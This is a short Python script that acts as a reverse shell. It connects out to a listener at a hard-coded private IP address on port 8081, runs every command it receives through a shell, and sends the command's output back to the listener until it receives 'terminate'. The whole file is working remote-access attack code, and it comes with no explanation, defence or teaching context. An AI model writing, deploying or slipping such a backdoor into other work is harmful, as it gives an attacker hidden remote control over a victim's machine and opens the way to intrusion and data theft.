from socket import socket
from subprocess import Popen, PIPE


def connect():
    s = socket()
    s.connect(('192.168.68.117', 8081))

    while True:
        command = s.recv(1024).decode()
        if 'terminate' in command:
            s.close()
            break

        stdout, stderr = Popen(
            command,
            shell=True,
            stdout=PIPE,
            stderr=PIPE,
        ).communicate()

        s.send(stdout)
        s.send(stderr)
        if not stderr and not stdout:
            s.send(b'Command Executed')
        


if __name__ == '__main__':
    connect()
